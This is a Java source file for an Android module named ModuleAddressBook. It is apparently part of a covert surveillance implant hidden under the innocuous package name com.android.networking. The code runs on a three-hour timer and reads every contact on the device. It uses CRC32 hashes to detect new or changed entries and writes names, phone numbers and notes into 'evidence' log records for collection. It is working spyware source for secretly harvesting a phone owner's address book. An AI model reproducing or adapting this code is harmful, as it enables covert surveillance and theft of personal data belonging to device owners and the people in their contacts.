package com.android.networking.module;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.ListIterator;

import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.crypto.Digest;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.LogR;
import com.android.networking.evidence.Markup;
import com.android.networking.module.task.Contact;
import com.android.networking.module.task.PhoneInfo;
import com.android.networking.module.task.PickContact;
import com.android.networking.module.task.UserInfo;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;
import com.android.networking.util.WChar;

public class ModuleAddressBook extends BaseModule {

	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$

	private PickContact contact;
	Markup markupContacts;
	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)

	public ModuleAddressBook() {

	}

	@Override
	public boolean parse(ConfModule conf) {
		return true;
	}

	/**
	 * unserialize the contacts crc hashtable
	 */
	@Override
	public void actualStart() {
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markupContacts = new Markup(this);

		// the markup exists, try to read it
		if (markupContacts.isMarkup()) {
			try {
				contacts = (HashMap<Long, Long>) markupContacts.readMarkupSerializable();
			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
				}
			}
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): no markup");
			}
		}

		// if no markup available, create a new empty one
		if (contacts == null) {
			contacts = new HashMap<Long, Long>();
			serializeContacts();
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart), got serialized contacs from markup: " + contacts.size());
			}
		}

	}

	/**
	 * serialize contacts in the markup
	 */
	private void serializeContacts() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (serializeContacts)");
		}
		if (Cfg.DEBUG) {
			Check.ensures(contacts != null, "null contacts"); //$NON-NLS-1$
		}

		try {

			final boolean ret = markupContacts.writeMarkupSerializable(contacts);
			if (Cfg.DEBUG) {
				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
			}
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
			}
		}
	}

	/**
	 * Every once and then read the contactInfo, and Check.every change. If
	 * //$NON-NLS-1$ something is new the contact is saved.
	 */
	@Override
	public void actualGo() {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): Contacts");
			}
			if (contacts()) {
				serializeContacts();
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (go) Error: " + ex);
			}
		}

	}

	private boolean contacts() {
		contact = new PickContact();

		final Date before = new Date();
		final List<Contact> list = contact.getContactInfo();
		final Date after = new Date();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);//$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): list size = " + list.size());//$NON-NLS-1$
		}

		final ListIterator<Contact> iter = list.listIterator();

		boolean needToSerialize = false;

		final LogR log = new LogR(EvidenceType.ADDRESSBOOK);
		
		// for every Contact
		while (iter.hasNext()) {
			final Contact c = iter.next();

			// calculate the crc of the contact
			final byte[] packet = preparePacket(c);
			// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
			// ByteArray.byteArrayToHex(packet));
			final Long crcOld = contacts.get(c.getId());
			final Long crcNew = Digest.CRC32(packet);
			// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
			// crcNew);

			// if does not match, save and serialize
			if (!crcNew.equals(crcOld)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (go): new contact. " + c);//$NON-NLS-1$
				}
				contacts.put(c.getId(), crcNew);
				
				log.write(packet);
				
				needToSerialize = true;
				//Thread.yield();
			}						
		}
		
		log.close();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (contacts), needto needToSerialize: " + needToSerialize);
		}
		return needToSerialize;
	}

	/**
	 * Prepare the packet from the contact
	 * 
	 * @param c
	 * @return
	 */
	private byte[] preparePacket(Contact c) {
		final UserInfo user = c.getUserInfo();
		// List<EmailInfo> email = c.getEmailInfo();
		// List<PostalAddressInfo> paInfo = c.getPaInfo();
		final List<PhoneInfo> phoneInfo = c.getPhoneInfo();
		// List<ImInfo> imInfo = c.getImInfo();
		// List<OrganizationInfo> orgInfo = c.getOrgInfo();
		// List<WebsiteInfo> webInfo = c.getWebInfo();
		final long uid = user.getUserId();
		final String name = user.getCompleteName();

		final int version = 0x01000000;

		// final byte[] header = new byte[12];

		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		// Adding header
		try {
			outputStream.write(ByteArray.intToByteArray(0)); // size
			outputStream.write(ByteArray.intToByteArray(version));
			outputStream.write(ByteArray.intToByteArray((int) uid));
		} catch (IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket) Error: " + ex);
			}
			return null;
		}

		final String message = c.getInfo();

		addTypedString(outputStream, (byte) 0x01, name);
		if (phoneInfo.size() > 0) {
			final String number = phoneInfo.get(0).getPhoneNumber();
			addTypedString(outputStream, (byte) 0x07, number);
		}
		addTypedString(outputStream, (byte) 0x37, message);

		final byte[] payload = outputStream.toByteArray();

		final int size = payload.length;

		// a questo punto il payload e' pronto
		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
		db_header.writeInt(size);

		return payload;
	}

	private void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);

			try {
				outputStream.write(ByteArray.intToByteArray(header));
				outputStream.write(WChar.getBytes(name, false));
			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (addTypedString): " + e);//$NON-NLS-1$
				}
			}
		}
	}

	@Override
	public void actualStop() {

	}
}
